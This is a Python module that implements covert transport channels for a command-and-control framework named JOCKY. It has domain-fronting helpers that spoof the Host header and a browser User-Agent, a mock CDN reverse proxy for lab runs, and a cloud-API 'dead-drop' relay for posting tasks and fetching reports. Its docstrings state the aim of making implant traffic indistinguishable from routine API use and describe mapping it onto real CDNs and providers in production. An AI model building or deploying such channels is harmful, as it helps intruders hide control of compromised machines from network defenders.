"""Transport channels for the JOCKY C2 fabric.

Implements the two channels the PS calls for ("traffic ... routed through
trusted cloud infrastructure or CDNs using domain fronting or legitimate
cloud APIs"):

1. DomainFront -- classic HTTPS-to-front / Host-header-routed traffic.
   The client connects to a CDN-terminated IP (the "front"); the Host
   header carries the front domain; the CDN forwards to the hidden origin
   (the "back") based on its own routing. A `MockCDN` is provided so the
   whole path is demonstrable in a lab WITHOUT touching a real CDN
   (real CDNs have largely blocked public domain fronting; see notes).
2. CloudApiDeadDrop -- ordinary webhook/paste-style relay: the controller
   "publishes" a task blob to an API, the client "fetches" it through the
   same API surface. Traffic is indistinguishable from the publisher's
   routine API traffic.

Both are dependency-free (urllib + http.server only).
"""

from __future__ import annotations

import http.server
import socketserver
import threading
import urllib.error
import urllib.request

# ---------------------------------------------------------------------------
# Channel 1: domain fronting
# ---------------------------------------------------------------------------


def fronted_get(url: str, front: str, timeout: float = 10.0, auth: str = "") -> bytes:
    """GET `url` while presenting the *front* domain in the Host header.

    `url` is the real socket destination (CDN IP / origin for lab mock).
    `front` is the domain name the CDN is configured to route. This is the
    same primitive used for task fetch and report post; TLS (SNI) would be
    layered on in production -- the mock keeps the Host-routing semantics.
    """
    req = urllib.request.Request(url, headers={"Host": front, "User-Agent": "Mozilla/5.0"})
    if auth:
        req.add_header("Authorization", auth)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        return e.read()


def fronted_post(url: str, front: str, data: bytes, ctype: str = "application/json",
                 timeout: float = 10.0, auth: str = "") -> bytes:
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"Host": front, "Content-Type": ctype,
                 "User-Agent": "Mozilla/5.0"})
    if auth:
        req.add_header("Authorization", auth)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        return e.read()


class MockCDNHandler(http.server.BaseHTTPRequestHandler):
    """Tiny reverse-proxy that routes by Host header (lab stand-in for a CDN).

    The CDN contract in real life: terminate TLS, read Host/SNI, forward to
    the origin route configured for that host. Here we forward to `origin`
    (the controller) preserving method/body/route 1:1.
    """

    origin = ("127.0.0.1", 8000)
    front_domains = ("front.example-cdn.com",)

    def _proxy(self, body: bytes | None = None):
        host = self.headers.get("Host", "")
        route = self.path
        # CDN would reject unknown front domains (404); replicate that.
        if host not in self.front_domains and host not in ("localhost", f"127.0.0.1:{self.server.server_port}"):
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"mock-cdn: unknown front domain")
            return
        url = f"http://{self.origin[0]}:{self.origin[1]}{route}"
        req = urllib.request.Request(url, method=self.command, data=body)
        for h in ("Content-Type", "Accept"):
            if self.headers.get(h):
                req.add_header(h, self.headers[h])
        try:
            with urllib.request.urlopen(req) as r:
                resp = r.read()
                self.send_response(r.status)
                self.send_header("Content-Type", r.headers.get("Content-Type", "application/octet-stream"))
                self.end_headers()
                self.wfile.write(resp)
        except urllib.error.HTTPError as e:
            resp = e.read()
            self.send_response(e.code)
            self.end_headers()
            self.wfile.write(resp)

    def do_GET(self):   self._proxy()          # noqa: E704
    def do_POST(self):  self._proxy(self.rfile.read(int(self.headers.get("Content-Length", 0))))  # noqa: E704,E501
    def log_message(self, *a):  pass


def start_mock_cdn(port: int = 9000, origin=("127.0.0.1", 8000)) -> threading.Thread:
    """Run the mock CDN in a background thread; returns the thread.

    NB: the server socket must stay open for process lifetime (created
    without ``with``) -- Windows raises WinError 10038 on select once the
    socket is closed while serve_forever is polling.
    """
    MockCDNHandler.origin = origin
    srv = socketserver.ThreadingTCPServer(("127.0.0.1", port), MockCDNHandler)
    srv.daemon_threads = True
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    th.server = srv  # type: ignore[attr-defined]
    return th


# ---------------------------------------------------------------------------
# Channel 2: legitimate cloud-API dead-drop
# ---------------------------------------------------------------------------

class CloudApiDeadDrop:
    """Model of a webhook/paste-style relay.

    The controller publishes a small sealed envelope (`.jxp` bytes + meta)
    through `put()`; clients poll `get()`. In the lab the relay is the
    controller itself (`agentdrop` endpoint); in production it maps 1:1 to
    a real provider's API (auth token, capped size, same two calls).
    """

    def __init__(self, api_base: str, token: str = ""):
        self.api_base = api_base.rstrip("/")
        self.token = token

    def put(self, drop_id: str, payload: bytes) -> None:
        fronted_post(f"{self.api_base}/agentdrop/put/{drop_id}", "localhost",
                     payload, ctype="application/octet-stream",
                     auth=f"Bearer {self.token}")

    def get(self, drop_id: str, timeout: float = 8.0) -> bytes | None:
        try:
            return fronted_get(f"{self.api_base}/agentdrop/get/{drop_id}",
                               "localhost", timeout=timeout,
                               auth=f"Bearer {self.token}")
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return None
            raise